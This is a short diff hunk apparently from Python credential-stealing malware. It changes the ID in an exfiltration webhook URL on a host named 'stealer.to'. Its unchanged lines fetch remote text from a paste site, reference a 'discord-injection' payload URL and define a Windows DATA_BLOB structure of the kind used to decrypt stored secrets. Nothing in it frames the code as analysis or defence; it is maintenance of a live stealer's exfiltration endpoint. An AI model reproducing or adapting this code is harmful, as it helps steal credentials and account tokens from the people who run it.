@@ -115,7 +115,7 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://stealer.to/post?uniqueid=eee7b6f6"
+h00k = "https://stealer.to/post?uniqueid=8c9b681b"
 inj3c710n_url = "https://rentry.co/discord-injection/raw"
 
 class DATA_BLOB(Structure):
